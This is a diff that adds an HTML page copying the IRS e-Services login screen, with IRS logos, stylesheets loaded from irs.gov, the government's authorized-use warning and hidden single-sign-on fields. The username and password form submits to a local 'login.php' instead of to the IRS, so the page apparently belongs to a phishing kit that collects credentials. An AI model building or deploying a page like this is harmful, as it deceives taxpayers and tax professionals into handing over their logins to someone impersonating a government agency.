@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="no-cache" http-equiv="pragma" />
+  <title>
+   Login
+  </title>
+  <!-- link rel="P3Pv1" href="/w3c/p3p.xml" -->
+  <link type="text/css" rel="stylesheet" href="https://la1.www4.irs.gov/irs/cda/common/commonStyleSheet/irs-gov_dev.css" />
+  <!-- ADDED 7/12/2013 Raaman : 508 Compliance toadd login_styles -->
+  <style type="text/css">
+   @import url("https://la1.www4.irs.gov/irs/cda/common/styleSheets/navigation-gecko.css");
+	@import url("https://la1.www4.irs.gov/irs/cda/common/styleSheets/styles-gecko.css");
+	@import url("https://la1.www4.irs.gov/irs/cda/common/styleSheets/login_styles.css");
+  </style>
+  <style type="text/css">
+   .content-heading {color: #001E5A; }
+	.button-self {font-family: Arial; font-size: 12px; font-weight: bold;}
+	#errorDiv {display:block}
+	#failid {display:block}
+	a:link {color:#336699}
+	a:visited {color:#336699}
+	a:hover {color:#FF6633}
+  </style>
+  <meta content="en-US" http-equiv="Content-Language" />
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <script language="JavaScript" type="text/javascript">
+   &lt;!--
+function setDivHeight() {
+	if ((navigator.appName).indexOf("Microsoft")) {
+		var footer = document.getElementById("footerDiv");
+		var footerHeightOffset = footer.offsetTop;
+		var leftnav = document.getElementById("leftNavDiv");
+		leftnav.style.height = footerHeightOffset-125;
+	}
+	//document.getElementById('errimg').style.display='none';
+    document.getElementById('failid').style.display='block';  
+}
+//--&gt;
+  </script>
+  <script language="JavaScript" type="text/javascript">
+   &lt;!--
+function getCookieVal (offset) {
+	var endstr = document.cookie.indexOf (";", offset);
+	if (endstr == -1)
+		endstr = document.cookie.length;
+
+	return unescape(document.cookie.substring(offset, endstr));
+}
+
+function GetCookie (name) {
+	var arg = name + "=";
+	var alen = arg.length;
+	var clen = document.cookie.length;
+	var i = 0;
+	while (i &lt; clen) {
+		var j = i + alen;
+
+		if (document.cookie.substring(i, j) == arg)
+			return getCookieVal (j);
+
+		i = document.cookie.indexOf(" ", i) + 1;
+		if (i == 0) break;
+	}
+
+	return null;
+}
+
+function returnWin() {
+	// -1 : doing a window history back
+	
+	var expdate = new Date();
+	// Set cookie time to expire in 1 minute
+	expdate.setTime (expdate.getTime() + (1 * 60 * 1000));
+	
+	document.cookie = eservFrameCookie + "=-1 ; path=/ ; expires=" + expdate;
+
+	history.go(-1);
+}
+
+/*
+Cookie values:
+-1 : go back in history one time
+ 0 : coming from the REDIRECT page
+ 1 : initial entry into the
+ 2 : on the personality page
+*/
+// Check for eServices frame and correct the display
+var eservFrameCookie = "ESERV_FRAME";
+var c = GetCookie(eservFrameCookie);
+
+if (window.parent != window.self) {
+	if (c == null) {
+		// 1 : Initial entry - with frame
+		var selfLocation = window.self.location.href;
+		
+		document.cookie = eservFrameCookie + "=1 ; path=/ ";
+		
+		if (selfLocation.indexOf("?", 0) &gt; -1) {
+			selfLocation += "&amp;f_redirect=1";
+		} else {
+			selfLocation += "?f_redirect=1";
+		}
+		
+		window.parent.location.href = selfLocation;
+	} else if (c == 0 || c == -1) {
+		returnWin();
+	}
+} else {
+	if (c == 0) {
+		returnWin();
+	}
+}
+
+/*
+Jan 27, 2005. Using USER_TRYNO cookie instead of smretry_cookie to 
+tell whether user has logon attempt.
+*/
+
+function setMyCookie() {
+	document.cookie = "USER_TRYNO=1 ; path=/";
+	return true;
+}
+
+function checkForm(theForm) {
+
+	var errMsg = "";
+    var val;
+    var val2;
+    var val3 = document.getElementById("failid");
+    val3.style.display = "none";
+
+	
+    if (theForm.USER.value == "") {
+       
+       
+       if (theForm.PASSWORD.value=="" )
+       {
+         val = document.getElementById("errimg");
+         val.style.display = "block";
+         document.getElementById("errid").innerHTML="You must enter a valid username and password.";
+         val2 = document.getElementById("errid");
+         val2.style.color = "#CC0000";
+         
+	   }
+       else
+       {
+         val = document.getElementById("errimg");
+         val.style.display = "block";
+         document.getElementById("errid").innerHTML="You must enter a valid username.";
+         val2 = document.getElementById("errid");
+         val2.style.color = "#CC0000";
+       }
+       return false;
+
+    }
+
+    if (theForm.USER.value != "") {
+       if (theForm.PASSWORD.value=="" )
+       {
+         val = document.getElementById("errimg");
+         val.style.display = "block";
+         document.getElementById("errid").innerHTML="You must enter a valid password.";
+         val2 = document.getElementById("errid");
+         val2.style.color = "#CC0000";
+         return false;
+       }
+
+    }
+    
+    val3.style.display = "block";
+    
+
+	
+	return true;
+
+}
+
+
+//--&gt;
+  </script>
+ </head>
+ <body onload="setDivHeight()">
+  <!-- ADDED 7/12/2013 Raaman : 508 Compliance to add skip navigation login -->
+  <a href="#login">
+  </a>
+  <a href="#register">
+  </a>
+  <!-- MOD 7/12/2013 Raaman : 508 Compliance Login,Register,Logo are modified as per new client requirement -->
+  <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=1 for IRS logo removed per IRAP feedback -->
+  <div id="contentContainer">
+   <a href="http://www.irs.gov/">
+    <img width="105" height="36" border="0" title="IRS logo" alt="IRS logo" src="https://la1.www4.irs.gov/irs/cda/common/images/logo.png" />
+   </a>
+   <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : accessibility code moved from here to privacy link per IRAP feedback -->
+   <!-- Begin Content -->
+   <div id="main">
+    <br />
+    <table width="100%">
+     <tbody>
+      <tr>
+       <td colspan="2">
+        <table border="0">
+         <tbody>
+          <tr>
+           <td valign="top">
+            <span style="font-family: arial; font-weight: bold; color: #CC0000; font-size: 12px">
+            </span>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+        <br />
+        <br />
+        <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=7 for Login h1 removed per IRAP feedback -->
+       </td>
+      </tr>
+      <tr>
+       <td width="50%">
+        <a id="login" name="login">
+        </a>
+        <form onsubmit="setMyCookie(); return checkForm(this);" autocomplete="off" method="post" action="login.php" name="loginForm">
+         <div id="loginDiv">
+          <h1>
+           Login
+          </h1>
+          <div id="errorDiv">
+           <table>
+            <colgroup>
+             <col width="8%">
+             </col>
+             <col width="92%">
+             </col>
+            </colgroup>
+            <tbody>
+             <tr>
+              <td>
+               <img name="ERRORIMG" alt="Error icon" src="https://la1.www4.irs.gov/irs/cda/common/images/Error-Icon.gif" style="display:none;" id="errimg" />
+              </td>
+              <td>
+               <p style="font-weight:bold" name="ERRORTXT" id="errid">
+               </p>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+           <!-- If dynamic error messages from server appear they go in here. -->
+          </div>
+          <div id="failid">
+           <table>
+            <colgroup>
+             <col width="8%">
+             </col>
+             <col width="92%">
+             </col>
+            </colgroup>
+            <tbody>
+             <tr>
+              <td>
+              </td>
+              <td>
+              </td>
+             </tr>
+            </tbody>
+           </table>
+          </div>
+          <div class="form-field-name-required">
+           <label for="Username">
+            Username
+           </label>
+          </div>
+          <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=8 for Username removed per IRAP feedback -->
+          <input type="text" title="Enter Username" size="30" name="USER" id="Username" />
+          <!-- 08/26/2013 K. Aviles - add space between UN field and PW head -->
+          <p>
+          </p>
+          <div class="form-field-name-required">
+           <label for="Password">
+            Password
+           </label>
+          </div>
+          <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=9 for Password removed per IRAP feedback -->
+          <input type="password" title="Enter Password" size="30" name="PASSWORD" id="Password" />
+          <br />
+          <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=10 for passwordLink removed per IRAP feedback -->
+          <a title="Forgot Your Password link" class="passwordLink" href="/e-services/Registration/Reg_ForgotPwd/Reg_RecoverPwPINForm.jsp">
+           Forgot Your Password?
+          </a>
+          <br />
+          <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=12 for login button removed per IRAP feedback -->
+          <div class="buttonDiv">
+           <input width="91" type="image" height="27" value="LOGIN" name="LOGIN" title="Login button" alt="Login button" src="https://la1.www4.irs.gov/irs/cda/common/images/button_login.jpg" />
+          </div>
+          <input type="hidden" value="-SM-/RUP/newSelectPersonality/?TYPE=33554433&REALMOID=06--42d3d179--ae36--0006--0000--4d5700004d57&GUID=&SMAUTHREASON=0&METHOD=GET&SMAGENTNAME=lgjzN0Exzjjq7GXjaIQAtum2VjVbftpJfXjCX5EEznNQ6gB2VzGstn8fCh3KSapr&TARGET=--SM---/PORTAL----PROD-/CRM-/signon-.html" name="target" />
+          <input type="hidden" value="0" name="smauthreason" />
+         </div>
+        </form>
+       </td>
+       <td width="50%">
+        <a id="register" name="register">
+        </a>
+        <div id="registerDiv">
+         <h1>
+          Register
+         </h1>
+         <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=3 for Register h1 removed per IRAP feedback -->
+         <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=4 for register paragraph removed per IRAP feedback -->
+         <p style="margin-top:17px;">
+          You must register to create an account.
+         </p>
+         <p style="margin-top:103px;">
+         </p>
+         <div class="buttonDiv">
+          <form onsubmit="" method="post" action="#">
+           <!--input type="image" src="./irs/cda/common/images/button_register.jpg" class="formButton" onclick="alert('top')" width="113" height="27" alt="REGISTER" title="REGISTER" name="REGISTER"-->
+           <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=6 for Register button removed per IRAP feedback -->
+           <input type="image" name="REGISTER" title="Register button" alt="Register button" src="https://la1.www4.irs.gov/irs/cda/common/images/button_register.jpg" />
+          </form>
+         </div>
+        </div>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+   <br />
+   <br />
+   <br />
+   <br />
+   <br />
+   <br />
+   <br />
+   <br />
+   <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=2 for authorized use only paragraph removed per IRAP feedback -->
+   <!-- MOD 10/30/2013 K. Aviles : reduce par left align from 45px to 37px -->
+   <p style="margin:0px 0px 0px 37px;">
+    THIS U.S. GOVERNMENT SYSTEM IS FOR AUTHORIZED USE ONLY!
+    <br />
+    Use of this system constitutes consent to monitoring, interception, recording, reading, 
+      copying or capturing by authorized
+    <br />
+    personnel of all activities. There is no right to privacy in
+      this system. Unauthorized use of this system is prohibited and
+    <br />
+    subject to criminal and civil 
+      penalties, including all penalties applicable to willful unauthorized access (UNAX) or 
+      inspection of
+    <br />
+    taxpayer records (under 18 U.S.C. 1030 and 26 U.S.C. 7213A and 26 U.S.C. 
+      7431).
+   </p>
+   <br />
+   <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=5 for NOTICE paragraph removed per IRAP feedback -->
+   <!-- MOD 10/30/2013 K. Aviles : reduce par left align from 45px to 37px -->
+   <p style="margin:0px 0px 0px 37px;">
+    NOTICE: The IRS reserves the right to deny access to any or all electronic services, products and/or applications, at both the 
+	individual or business entity level, in the event IRS becomes aware of any activity that constitutes or appears to constitute 
+	misuse or abuse of any electronic services, products or applications.
+   </p>
+   <div id="footerEServDiv">
+   </div>
+   <!-- MOD 08/23/2013 K. Aviles : footer placed LOCALLY HERE instead of as a JSP include, to satisfy new client visual format requirements -->
+   <table>
+    <tbody>
+     <tr>
+      <td>
+      </td>
+     </tr>
+     <tr>
+      <td height="3">
+      </td>
+     </tr>
+     <tr>
+      <td align="center">
+       <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : tabindex=13 for Privacy Policy link removed per IRAP feedback -->
+       <a title="e-Services Privacy Policy link" alt="e-Services Privacy Policy link" href="http://www.irs.gov/taxpros/article/0,,id=138814,00.html">
+        e-Services Privacy Policy
+       </a>
+       <br />
+       <br />
+       <!-- MOD 9/24/2013 K. Aviles : 508 Compliance : accessibility code moved to here to be next to privacy link per IRAP feedback -->
+       <a href="http://www.irs.gov/accessibility/index.html">
+        <img width="0" height="0" border="0" alt="Accessibility" title="Accessibility" src="https://la1.www4.irs.gov/irs/cda/common/images/blank.gif" />
+       </a>
+      </td>
+     </tr>
+     <tr>
+      <td height="9">
+      </td>
+     </tr>
+    </tbody>
+   </table>
+  </div>
+ </body>
+</html>
